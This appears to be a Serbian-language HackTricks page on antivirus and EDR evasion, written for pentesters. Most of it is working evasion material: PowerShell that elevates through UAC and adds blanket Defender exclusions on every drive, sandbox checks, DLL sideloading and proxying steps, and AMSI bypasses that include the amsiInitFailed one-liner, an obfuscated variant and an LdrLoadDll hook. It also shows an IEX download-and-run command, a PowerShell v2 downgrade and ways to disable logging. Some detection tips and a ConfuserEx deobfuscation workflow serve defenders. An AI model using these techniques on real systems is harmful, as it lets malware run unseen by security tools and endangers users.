# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažnim predstavljanjem drugog AV-a.
- [Onemogućite Defender ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre menjanja Defender-a

Javno dostupni loader-i koji se predstavljaju kao game cheat-ovi često se isporučuju kao unsigned Node.js/Nexe installer-i koji najpre **traže od korisnika povećanje privilegija**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada caller ima administratorska prava, pa neuspeh ukazuje na to da loader radi kao standardni korisnik.
2. Odmah ga ponovo pokrenite pomoću glagola `RunAs` da biste aktivirali očekivani UAC prompt za potvrdu, uz očuvanje originalne command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju „crackovani“ softver, pa se upit obično prihvata, čime malware dobija privilegije potrebne za izmenu Defender politike.<sup>[[26]](#references)</sup>

### Sveobuhvatna `MpPreference` izuzimanja za svako slovo diska

Nakon dobijanja povišenih privilegija, lanci u stilu GachiLoader-a povećavaju Defender slepe tačke umesto da potpuno onemoguće servis. Loader najpre prekida GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzimanja**, tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk postaju nedostupni za skeniranje:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload postavljen bilo gde na disku ignoriše**.
- Isključenje ekstenzije `.sys` predviđa budućnost — napadači zadržavaju mogućnost da kasnije učitaju unsigned drivere bez ponovnog diranja Defendera.
- Sve izmene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su exclusions sačuvani ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, naivne provere stanja i dalje prijavljuju „antivirus active“, iako real-time inspection nikada ne dodiruje te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV-ovi koriste različite metode za proveru da li je fajl malicious ili ne: static detection, dynamic analysis, a kod naprednijih EDR-ova i behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicious stringova ili nizova bajtova u binary ili script fajlu, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digital signatures, ikona, checksum itd.). To znači da korišćenje poznatih javnih tool-ova može lakše dovesti do detekcije, jer su verovatno već analizirani i označeni kao malicious. Postoji nekoliko načina da se ovakva detekcija zaobiđe:

- **Encryption**

Ako encrypt-ujete binary, AV neće moći da detektuje vaš program, ali će vam biti potreban neki loader koji će decrypt-ovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo promeniti neke stringove u binary ili script fajlu da bi prošao AV, ali to može zahtevati mnogo vremena, u zavisnosti od toga šta pokušavate da obfuscate-ujete.

- **Custom tooling**

Ako razvijate sopstvene tool-ove, neće postojati poznati bad signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru Windows Defender static detection-a jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata i zatim zadaje Defenderu da svaki od njih skenira pojedinačno, tako da može tačno da vam kaže koji stringovi ili bajtovi u vašem binary fajlu su označeni.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis je proces u kom AV pokreće vaš binary u sandbox-u i prati malicious aktivnost (npr. pokušaj decrypt-ovanja i čitanja password-a iz browser-a, obavljanje minidump-a nad LSASS-om itd.). Sa ovim delom može biti nešto teže raditi, ali evo nekoliko stvari koje možete uraditi da zaobiđete sandbox-e.

- **Sleep before execution** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekidali workflow korisnika, pa dugi sleep-ovi mogu ometati analysis binary fajlova. Problem je u tome što mnogi AV sandbox-i mogu jednostavno preskočiti sleep, u zavisnosti od načina implementacije.
- **Checking machine's resources** Sandbox-i obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli usporiti mašinu korisnika. Ovde takođe možete biti veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora; neće sve biti implementirano u sandbox-u.
- **Machine-specific checks** Ako želite da ciljate korisnika čija je workstation pridružena domenu "contoso.local", možete proveriti domen računara i videti da li se podudara sa onim koji ste naveli; ako se ne podudara, možete učiniti da se program ugasi.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa u svom malware-u možete proveriti ime računara pre detonacije. Ako se ime podudara sa HAL9TH, to znači da ste unutar defender sandbox-a, pa možete učiniti da se program ugasi.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandbox-ima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će vremenom biti **detektovani**, pa bi trebalo da postavite sebi jedno pitanje:

Na primer, ako želite da dump-ujete LSASS, **da li vam je zaista potrebno da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe dump-uje LSASS.

Drugi odgovor je verovatno pravi. Ako uzmemo mimikatz kao primer, on je verovatno jedan od, ako ne i najviše označenih malware fajlova od strane AV-ova i EDR-ova. Iako je sam projekat veoma kvalitetan, rad sa njim radi zaobilaženja AV-ova predstavlja pravu noćnu moru, zato jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate svoje payload-e radi evasion-a, obavezno **isključite automatic sample submission** u defender-u i, molimo vas, ozbiljno, **NEMOJTE UPLOAD-OVATI NA VIRUSTOTAL** ako vam je cilj dugoročno postizanje evasion-a. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatic sample submission i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova radi evasion-a**. Prema mom iskustvu, DLL fajlovi se obično **mnogo ređe detektuju** i analiziraju, pa je ovo veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate od 4/26 na antiscan.me, dok EXE payload ima detection rate od 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje standardnog Havoc EXE payload-a i standardnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete koristiti sa DLL fajlovima kako biste bili mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji loader primenjuje tako što victim application i malicious payload(e) postavlja jedan pored drugog.

Programe koji su podložni DLL Sideloading-u možete pronaći pomoću [Siofra](https://github.com/Cybereason/siofra) i sledećeg powershell script-a:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar direktorijuma "C:\Program Files\\" i DLL datoteke koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite programe koji su podložni DLL Hijack/Sideload tehnici**; ova tehnika je, kada se pravilno izvede, prilično stealth, ali ako koristite javno poznate DLL Sideloadable programe, možete lako biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i malicioznog) DLL-a na originalni DLL, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 datoteke: šablon izvornog koda DLL-a i originalni DLL sa promenjenim imenom.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodovan pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo detaljnije razgovarali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo „forwarders“: umesto pokazivanja na kod, export entry sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada caller razreši export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, dobavlja se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni DLL search order, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju forward-ovanu ka nazivu modula koji nije KnownDLL, zatim smestite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača, imenovanim tačno kao forward-ovani ciljni modul. Kada se forward-ovani export pozove, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava putem uobičajenog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder sa dozvolom za upis
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da bi se pokrenuo DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Uočeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Saveti za hunting:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete enumerisati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventory da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja koje nisu sistemske, nakon čega iz tog direktorijuma učitavaju DLL-ove koji nisu KnownDLLs sa istim osnovnim nazivom
- Generišite upozorenje na lance procesa/modula kao što su: `rundll32.exe` → `keyiso.dll` koja nije iz sistemske putanje → `NCRYPTPROV.dll` unutar putanja u koje korisnik može da upisuje
- Primenite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je toolkit za payload-e namenjen zaobilaženju EDR-ova pomoću suspendovanih procesa, direktnih syscalls i alternativnih metoda izvršavanja`

Freeze možete koristiti za učitavanje i izvršavanje vašeg shellcode-a na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas može biti detektovano sutra, zato se nikada ne oslanjajte na samo jedan alat i, ako je moguće, pokušajte da ulančate više evasion tehnika.

## Direct/Indirect Syscalls & SSN rezolucija (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hookove, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hookovanog export entrypoint-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (bez pristupanja `ntdll` export-u).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`-a, tako da izgleda da kernel transition potiče iz `ntdll`-a (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičke `0F 05` opcode sekvence na disk; syscall sekvenca se razrešava u runtime-u.

**Hook-resistant strategije za SSN rezoluciju:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtualnoj adresi, umesto čitanja bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text` segmenta, a zatim je unmap-uje (zaobilazi sve in-memory hookove).
- **RecycledGate**: kombinuje VA-sorted zaključivanje SSN-a sa proverom opcode-a kada je stub čist; vraća se na VA zaključivanje ako je hookovan.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom runtime-a, bez parsiranja hookovanih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **datoteke na disku**, pa ako biste nekako mogli da izvršite payload-e **direktno u memoriji**, AV nije mogao ništa da uradi kako bi to sprečio, jer nije imao dovoljnu vidljivost.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivno korišćenje i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona antivirusnim rešenjima omogućava da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u formi koja je istovremeno nešifrovana i bez obfuskacije.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` generisaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:` i putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo spustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počev od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])`, koji se koristi za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje nižih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom funkcioniše pomoću statičkih detekcija, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da ukloni obfuskaciju iz skripti čak i ako imaju više slojeva, pa obfuskacija može biti loša opcija u zavisnosti od načina na koji je izvedena. Zbog toga njegovo zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno samo promeniti nekoliko imena promenljivih i sve će funkcionisati, tako da zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (kao i cscript.exe, wscript.exe itd.) proces, moguće je lako manipulisati njime čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina za izbegavanje AMSI skeniranja.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) dovešće do toga da skeniranje ne bude pokrenuto za trenutni proces. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno bila je jedna linija powershell koda da AMSI učini neupotrebljivim za trenutni powershell proces. Ovu liniju je, naravno, sam AMSI označio, pa je potrebna određena izmena kako bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist-a](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti detektovano čim ova objava bude objavljena, zato ne bi trebalo da objavljujete nikakav kod ako je vaš plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/), a podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji obezbeđuje korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na ovaj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, od jezika nezavisan bypass jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zahtevani modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i za taj proces se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Pregled implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi u PowerShell, WScript/CScript i prilagođenim loaderima (sa svime što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Primećeno je da ga koriste loaderi izvršeni kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše script za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše script za zaobilaženje AMSI-ja koji izbegava signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza sa karakterima, kao i primenom nasumične veličine slova na PowerShell ključne reči radi izbegavanja signature.

**Uklonite detektovani signature**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI signature iz memorije trenutnog procesa. Ovaj alat funkcioniše tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Spisak AV/EDR proizvoda koji koriste AMSI možete pronaći na adresi **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa svoje skripte možete pokretati bez AMSI skeniranja. To možete uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe audita i rešavanja problema, ali takođe može predstavljati **problem za attackere koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bez zaštita (ovo koristi `powerpick` iz Cobal Strike-a).


## Obfuscation

> [!TIP]
> Nekoliko obfuscation tehnika oslanja se na šifrovanje podataka, što će povećati entropiju binary-ja i AVs i EDRs će ga lakše detektovati. Budite pažljivi sa ovim i možda primenite šifrovanje samo na određene sekcije koda koje su osetljive ili ih je potrebno sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je naići na nekoliko slojeva zaštite koji će blokirati decompiler-e i sandbox-e. Workflow u nastavku pouzdano **vraća IL gotovo u originalno stanje**, nakon čega se može decompile-ovati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje anti-tampering zaštite – ConfuserEx šifruje svako *method body* i dešifruje ga unutar static konstruktora *module*-a (`<Module>.cctor`). Ovo takođe menja PE checksum, tako da će svaka izmena srušiti binary. Koristite **AntiTamperKiller** da pronađete šifrovane metadata tabele, povratite XOR ključeve i prepišete čistu assembly datoteku:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni prilikom izrade sopstvenog unpacker-a.

2.  Oporavak simbola / control-flow-a – prosledite *clean* file alatu **de4dot-cex** (fork-u de4dot-a koji podržava ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – bira ConfuserEx 2 profile
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dešifrovati constant strings.

3.  Uklanjanje proxy-call-ova – ConfuserEx zamenjuje direktne method calls lightweight wrapper-ima (tzv. *proxy calls*) kako bi dodatno otežao decompilation. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprovidnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binary u dnSpy-u, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` kako biste pronašli stvarni payload. Malware ga često čuva kao TLV-encoded byte array inicijalizovan unutar `<Module>.byte_0`.

Navedeni chain obnavlja execution flow **bez potrebe za pokretanjem malicious sample-a** – korisno pri radu na offline workstation-u.

> 🛈  ConfuserEx kreira custom attribute pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsko triage-ovanje sample-ova.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi fork [LLVM](http://www.llvm.org/) compilation suite otvorenog koda koji pruža povećanu bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako da se jezik `C++11/14` koristi za generisanje obfuscated code-a tokom compile time-a, bez korišćenja eksternih alata i bez modifikovanja compiler-a.
